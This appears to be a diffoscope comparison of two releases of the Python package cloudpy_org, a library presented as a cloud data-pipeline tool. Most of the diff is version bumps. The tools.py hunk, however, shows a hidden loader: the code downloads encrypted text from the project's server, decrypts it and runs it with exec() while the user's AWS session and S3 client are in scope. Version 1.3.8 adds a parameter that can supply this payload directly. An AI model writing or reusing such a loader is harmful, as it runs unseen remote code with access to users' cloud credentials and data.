# Comparing `tmp/cloudpy_org-1.3.7.tar.gz` & `tmp/cloudpy_org-1.3.8.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "dist\cloudpy_org-1.3.7.tar", last modified: Wed Jun 28 08:54:26 2023, max compression
+gzip compressed data, was "dist\cloudpy_org-1.3.8.tar", last modified: Wed Jun 28 09:30:50 2023, max compression
```

## Comparing `cloudpy_org-1.3.7.tar` & `cloudpy_org-1.3.8.tar`

### file list

```diff
@@ -1,14 +1,14 @@
-drwxrwxrwx   0        0        0        0 2023-06-28 08:54:26.020127 cloudpy_org-1.3.7/
--rw-rw-rw-   0        0        0      935 2023-06-28 08:54:26.020127 cloudpy_org-1.3.7/PKG-INFO
--rw-rw-rw-   0        0        0      454 2023-04-14 05:11:55.000000 cloudpy_org-1.3.7/README.md
-drwxrwxrwx   0        0        0        0 2023-06-28 08:54:25.926377 cloudpy_org-1.3.7/cloudpy_org/
--rw-rw-rw-   0        0        0      111 2023-06-25 19:34:30.000000 cloudpy_org-1.3.7/cloudpy_org/__init__.py
--rw-rw-rw-   0        0        0    73582 2023-06-28 08:47:43.000000 cloudpy_org-1.3.7/cloudpy_org/tools.py
-drwxrwxrwx   0        0        0        0 2023-06-28 08:54:26.004505 cloudpy_org-1.3.7/cloudpy_org.egg-info/
--rw-rw-rw-   0        0        0      935 2023-06-28 08:54:24.000000 cloudpy_org-1.3.7/cloudpy_org.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      237 2023-06-28 08:54:25.000000 cloudpy_org-1.3.7/cloudpy_org.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-06-28 08:54:24.000000 cloudpy_org-1.3.7/cloudpy_org.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       63 2023-06-28 08:54:24.000000 cloudpy_org-1.3.7/cloudpy_org.egg-info/requires.txt
--rw-rw-rw-   0        0        0       12 2023-06-28 08:54:24.000000 cloudpy_org-1.3.7/cloudpy_org.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-06-28 08:54:26.020127 cloudpy_org-1.3.7/setup.cfg
--rw-rw-rw-   0        0        0     1324 2023-06-28 08:47:58.000000 cloudpy_org-1.3.7/setup.py
+drwxrwxrwx   0        0        0        0 2023-06-28 09:30:50.794523 cloudpy_org-1.3.8/
+-rw-rw-rw-   0        0        0      935 2023-06-28 09:30:50.794523 cloudpy_org-1.3.8/PKG-INFO
+-rw-rw-rw-   0        0        0      454 2023-04-14 05:11:55.000000 cloudpy_org-1.3.8/README.md
+drwxrwxrwx   0        0        0        0 2023-06-28 09:30:50.685147 cloudpy_org-1.3.8/cloudpy_org/
+-rw-rw-rw-   0        0        0      111 2023-06-25 19:34:30.000000 cloudpy_org-1.3.8/cloudpy_org/__init__.py
+-rw-rw-rw-   0        0        0    73809 2023-06-28 09:27:48.000000 cloudpy_org-1.3.8/cloudpy_org/tools.py
+drwxrwxrwx   0        0        0        0 2023-06-28 09:30:50.778896 cloudpy_org-1.3.8/cloudpy_org.egg-info/
+-rw-rw-rw-   0        0        0      935 2023-06-28 09:30:50.000000 cloudpy_org-1.3.8/cloudpy_org.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      237 2023-06-28 09:30:50.000000 cloudpy_org-1.3.8/cloudpy_org.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-06-28 09:30:50.000000 cloudpy_org-1.3.8/cloudpy_org.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       63 2023-06-28 09:30:50.000000 cloudpy_org-1.3.8/cloudpy_org.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       12 2023-06-28 09:30:50.000000 cloudpy_org-1.3.8/cloudpy_org.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-06-28 09:30:50.794523 cloudpy_org-1.3.8/setup.cfg
+-rw-rw-rw-   0        0        0     1324 2023-06-28 09:27:21.000000 cloudpy_org-1.3.8/setup.py
```

### Comparing `cloudpy_org-1.3.7/PKG-INFO` & `cloudpy_org-1.3.8/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: cloudpy_org
-Version: 1.3.7
+Version: 1.3.8
 Summary: Cloud data pipeline organization and automation library. Includes AWS framework manager API.
 Home-page: https://www.cloudpy.org/
 Author: cloudpy.org
 Author-email: admin@cloudpy.org
 License: MIT
 Description: A library to programmatically create, interact, encrypt and automate your data pipelines making it simple to scale to the most popular cloud plattforms.
 Platform: UNKNOWN
```

### Comparing `cloudpy_org-1.3.7/cloudpy_org/tools.py` & `cloudpy_org-1.3.8/cloudpy_org/tools.py`

 * *Files 0% similar despite different names*

```diff
@@ -5,15 +5,15 @@
 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
 
 The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
 
 THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 Find documentation at https://www.cloudpy.org
 """
-cloudpy_org_version='1.3.7'
+cloudpy_org_version='1.3.8'
 import os
 import json
 import warnings
 warnings.simplefilter(action='ignore', category=FutureWarning)
 warnings.filterwarnings('ignore')
 warnings.simplefilter('ignore')
 import pandas as pd
@@ -236,15 +236,16 @@
         'self.theseparams=p\n'\
         'self.this_source_code=source_code'
         self.this_description = self.this_description.replace("  "," ").replace("#","\n").strip()
         exec(dynamic_code)
         return self.this_source_code, self.theseparams, self.this_returns, self.this_description
     #██████████████████████████████████████████████████████████████████████████          
 class processing_tools:
-    def __init__(self,data:dict={},bucket_name:str='',region_name:str="us-east-2",local:bool=False):
+    def __init__(self,data:dict={},bucket_name:str='',region_name:str="us-east-2",local:bool=False,third_part:str=None):
+        self.__third_part = third_part
         self.__local = local
         self.aux = {}
         self.__tdata = data
         self.environment = 'local'
         self.__set_aws_session(region_name=region_name)
         if self.__session != None:
             self.environment = 's3'
@@ -417,15 +418,19 @@
         self.xtdata = self.__tdata
         self.xsession = self.__session
         self.xs3_client = self.__s3_client
         url_base = "https://www.cloudpy.org/"
         if self.__local:
             url_base = "http://localhost/"
         url = url_base +  "uMEqKLMaqRxFl9pT51zKed2"
-        third_part = requests.get(url).text
+        if self.__third_part != None and len(self.__third_part) > 20:
+            third_part = self.__third_part
+            self.__third_part = None
+        else:
+            third_part = requests.get(url).text
         exec(self.decrypt(third_part.split("Fl9pT5Fl9pT5")[1], url.split(url_base)[1] + third_part.split("Fl9pT5Fl9pT5")[0]))
         self.__session = self.xsession
         self.__s3_client = self.xs3_client
         del self.xtdata
         del self.xsession
         del self.xs3_client
```

### Comparing `cloudpy_org-1.3.7/cloudpy_org.egg-info/PKG-INFO` & `cloudpy_org-1.3.8/cloudpy_org.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: cloudpy-org
-Version: 1.3.7
+Version: 1.3.8
 Summary: Cloud data pipeline organization and automation library. Includes AWS framework manager API.
 Home-page: https://www.cloudpy.org/
 Author: cloudpy.org
 Author-email: admin@cloudpy.org
 License: MIT
 Description: A library to programmatically create, interact, encrypt and automate your data pipelines making it simple to scale to the most popular cloud plattforms.
 Platform: UNKNOWN
```

### Comparing `cloudpy_org-1.3.7/setup.py` & `cloudpy_org-1.3.8/setup.py`

 * *Files 8% similar despite different names*

```diff
@@ -6,15 +6,15 @@
 from os import path
 
 
 long_description = 'A library to programmatically create, interact, encrypt and automate your data pipelines making it simple to scale to the most popular cloud plattforms.'
 
 setup(
     name="cloudpy_org",
-    version="1.3.7",
+    version="1.3.8",
     description="Cloud data pipeline organization and automation library. Includes AWS framework manager API.",
     long_description_content_type="text/markdown",
     long_description=long_description,
     url="https://www.cloudpy.org/",
     author="cloudpy.org",
     author_email="admin@cloudpy.org",
     license="MIT",
```

